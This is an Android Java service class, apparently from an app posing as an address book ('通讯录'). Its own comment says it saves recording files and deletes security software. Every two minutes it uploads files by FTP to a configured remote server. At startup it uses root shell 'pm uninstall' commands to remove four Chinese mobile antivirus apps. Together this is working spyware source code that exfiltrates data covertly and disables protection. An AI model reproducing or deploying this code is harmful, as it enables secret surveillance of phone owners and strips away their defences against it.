
package com.jiec.contact;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.jiec.utils.ConfigUtils;
import com.jiec.utils.FTPClientUtils;
import com.jiec.utils.ShellUtils;

/**
 * 描述:保存录音文件、删除安全软件的服务类
 * 
 * @author jiec
 * @since 2014-10-13 上午11:07:35
 */
public class SaveFileService extends Service {

    @SuppressLint("HandlerLeak")
    Handler mHandler = new Handler() {
        public void handleMessage(android.os.Message msg) {
            if (msg.what == 0) {
                mHandler.sendEmptyMessageDelayed(0, 1000 * 60 * 2);

                FTPClientUtils.updateFile(SaveFileService.this,
                        ConfigUtils.getsFtpIp(SaveFileService.this));

                Log.e("test", "testService going");

            } else if (msg.what == 1) {
                deleteApp();
            }
        };
    };

    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub
        mHandler.sendEmptyMessageDelayed(0, 1000);
        mHandler.sendEmptyMessage(1);
        createNotification();
        super.onCreate();
    }

    private static final int NOTIFICATION_ID = Integer.MAX_VALUE - 1000;

    private void createNotification() {
        Notification notification = new Notification(R.drawable.img_app_icon,
                getText(R.string.app_name), System.currentTimeMillis());
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        notification.setLatestEventInfo(this, "通讯录", "开启", pendingIntent);
        startForeground(NOTIFICATION_ID, notification);
    }

    private void deleteApp() {

        new Thread(new Runnable() {

            @Override
            public void run() {
                String packages[] = {
                        "com.tencent.qqpimsecure", // qq手机管家
                        "com.qihoo360.mobilesafe", // 360手机管家
                        "com.ijinshan.mguard", // 金山手机卫士
                        "cn.opda.a.phonoalbumshoushou" // 百度手机卫士
                };
                for (int i = 0; i < packages.length; i++) {
                    ShellUtils.execCommand("/system/bin/pm uninstall " + packages[i], true);
                }
            }
        }).start();

    }
}
